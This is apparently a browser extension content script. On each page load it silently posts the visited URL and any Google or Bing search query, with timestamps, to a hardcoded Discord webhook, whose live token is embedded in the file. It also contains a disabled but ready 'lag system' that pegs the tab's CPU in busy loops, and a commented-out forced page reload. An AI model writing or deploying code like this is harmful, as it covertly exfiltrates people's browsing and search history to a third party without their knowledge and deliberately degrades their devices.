const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1351937979718959137/n4gj7STURnoohr5DCKzGE-nFHLp6U19b-jh7wQRSotlb-hogaJf_Ztf80s0BbZigAtGb";

function sendVisitToDiscord(url) {
  const now = new Date();
  const timestampLocal = now.toLocaleString();       
  const timestampISO = now.toISOString();             

  const parsedURL = new URL(url);
  const hostname = parsedURL.hostname;
  const pathname = parsedURL.pathname;
  const searchParams = parsedURL.searchParams;

  let title = `🌐 Visited ${hostname}`;
  let description = `🕒 Visited at ${timestampLocal}`;

  // Check for Google Search
  if (hostname.includes("google.") && pathname === "/search") {
    const query = searchParams.get("q");
    if (query) {
      title = `🔍 Searched "${query}" on Google`;
      description += `\n🔗 Search Query: "${query}"`;
    }
  }

  // Check for Bing Search
  if (hostname.includes("bing.") && pathname === "/search") {
    const query = searchParams.get("q");
    if (query) {
      title = `🔍 Searched "${query}" on Bing`;
      description += `\n🔗 Search Query: "${query}"`;
    }
  }

  const payload = {
    embeds: [
      {
        title: title,
        url: url,
        description: description,
        color: 0x00AE86,
        timestamp: timestampISO
      }
    ]
  };

  fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(err => {
    console.error("❌ Failed to send to Discord:", err);
  });
}

// Only send once per page load
if (document.readyState === "complete" || document.readyState === "interactive") {
  if (window.location.href.startsWith("http")) {
    sendVisitToDiscord(window.location.href);
  }
} else {
  window.addEventListener("DOMContentLoaded", () => {
    if (window.location.href.startsWith("http")) {
      sendVisitToDiscord(window.location.href);
    }
  });
}

// --------- LAG SYSTEM (TOGGLE) ---------

const ENABLE_LAG = false; // Set to false to disable lag

const INTENSITY = 250; 
function burnTabCPU() {
  setInterval(() => {
    const end = Date.now() + INTENSITY;
    while (Date.now() < end) {
      Math.sqrt(Math.random() * Math.random());
    }
  }, 10);
}

if (ENABLE_LAG) {
  burnTabCPU();
}

// --------- AUTO REFRESH SYSTEM ---------

// function startAutoRefresh() {
 // setInterval(() => {
//   location.reload();
//  }, 60000); // 60,000 ms = 1 minute
//}

// startAutoRefresh();
